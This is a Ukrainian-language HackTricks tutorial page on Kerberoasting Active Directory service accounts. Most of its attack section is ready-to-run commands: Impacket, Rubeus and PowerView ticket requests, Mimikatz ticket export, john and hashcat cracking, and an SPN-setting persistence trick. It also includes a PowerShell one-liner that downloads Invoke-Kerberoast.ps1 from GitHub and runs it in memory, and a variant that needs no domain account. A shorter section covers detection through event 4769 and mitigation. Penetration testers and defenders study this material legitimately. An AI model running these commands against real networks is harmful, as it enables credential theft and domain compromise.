# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
Вчіться та практикуйте хакінг AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Kerberoast

Kerberoasting зосереджується на отриманні **TGS квитків**, зокрема тих, що стосуються служб, які працюють під **обліковими записами користувачів** в **Active Directory (AD)**, виключаючи **облікові записи комп'ютерів**. Шифрування цих квитків використовує ключі, які походять з **паролів користувачів**, що дозволяє можливість **офлайн злому облікових даних**. Використання облікового запису користувача як служби вказується ненульовим значенням властивості **"ServicePrincipalName"**.

Для виконання **Kerberoasting** необхідний обліковий запис домену, здатний запитувати **TGS квитки**; однак цей процес не вимагає **спеціальних привілеїв**, що робить його доступним для будь-кого з **дійсними доменними обліковими даними**.

### Ключові моменти:

* **Kerberoasting** націлений на **TGS квитки** для **служб облікових записів користувачів** в **AD**.
* Квитки, зашифровані ключами з **паролів користувачів**, можуть бути **зламані офлайн**.
* Служба визначається ненульовим **ServicePrincipalName**.
* **Не потрібні спеціальні привілеї**, лише **дійсні доменні облікові дані**.

### **Атака**

{% hint style="warning" %}
**Інструменти Kerberoasting** зазвичай запитують **`RC4 шифрування`** під час виконання атаки та ініціювання запитів TGS-REQ. Це пов'язано з тим, що **RC4 є** [**слабшим**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) і легшим для злому офлайн за допомогою таких інструментів, як Hashcat, ніж інші алгоритми шифрування, такі як AES-128 та AES-256.\
Хеші RC4 (тип 23) починаються з **`$krb5tgs$23$*`**, тоді як AES-256 (тип 18) починаються з **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Багатофункціональні інструменти, включаючи дамп користувачів, які підлягають kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Перелічити користувачів, які підлягають Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Техніка 1: Запросіть TGS та вивантажте його з пам'яті**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Техніка 2: Автоматизовані інструменти**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Коли запитується TGS, генерується подія Windows `4769 - Було запитано квиток служби Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast), щоб легко створювати та **автоматизувати робочі процеси**, підтримувані **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

Якщо у вас є **достатньо прав** над користувачем, ви можете **зробити його придатним для керберостингу**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Ви можете знайти корисні **інструменти** для атак **kerberoast** тут: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Якщо ви отримали цю **помилку** з Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, це через ваш локальний час, вам потрібно синхронізувати хост з DC. Є кілька варіантів:

* `ntpdate <IP of DC>` - Застаріло з Ubuntu 16.04
* `rdate -n <IP of DC>`

### Зменшення ризиків

Kerberoasting може бути проведено з високим ступенем прихованості, якщо це експлуатовано. Для виявлення цієї активності слід звернути увагу на **Security Event ID 4769**, який вказує на те, що запит на квиток Kerberos був зроблений. Однак, через високу частоту цієї події, необхідно застосувати специфічні фільтри для ізоляції підозрілої активності:

* Ім'я служби не повинно бути **krbtgt**, оскільки це нормальний запит.
* Імена служб, що закінчуються на **$**, слід виключити, щоб уникнути включення облікових записів машин, що використовуються для служб.
* Запити з машин слід фільтрувати, виключаючи імена облікових записів, відформатовані як **machine@domain**.
* Слід враховувати лише успішні запити на квитки, які ідентифікуються кодом помилки **'0x0'**.
* **Найголовніше**, тип шифрування квитка повинен бути **0x17**, який часто використовується в атаках Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Щоб зменшити ризик Kerberoasting:

* Переконайтеся, що **паролі облікових записів служб важко вгадати**, рекомендується довжина більше **25 символів**.
* Використовуйте **управляючі облікові записи служб**, які пропонують переваги, такі як **автоматичні зміни паролів** та **делеговане управління іменами службових принципалів (SPN)**, що підвищує безпеку проти таких атак.

Впроваджуючи ці заходи, організації можуть значно зменшити ризик, пов'язаний з Kerberoasting.

## Kerberoast без облікового запису домену

У **вересні 2022 року** новий спосіб експлуатації системи був представлений дослідником на ім'я Чарлі Кларк, поділений через його платформу [exploit.ph](https://exploit.ph/). Цей метод дозволяє отримувати **службові квитки (ST)** через запит **KRB\_AS\_REQ**, який, що дивно, не вимагає контролю над жодним обліковим записом Active Directory. По суті, якщо принципал налаштований таким чином, що не вимагає попередньої аутентифікації — сценарій, подібний до того, що в кібербезпеці відомий як **атака AS-REP Roasting** — цю характеристику можна використати для маніпуляції процесом запиту. Зокрема, шляхом зміни атрибута **sname** в тілі запиту система обманюється на видачу **ST** замість стандартного зашифрованого квитка на отримання квитків (TGT).

Техніка повністю пояснена в цій статті: [блог Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Вам потрібно надати список користувачів, оскільки у нас немає дійсного облікового запису для запиту LDAP за допомогою цієї техніки.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py з PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus з PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
Вивчайте та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
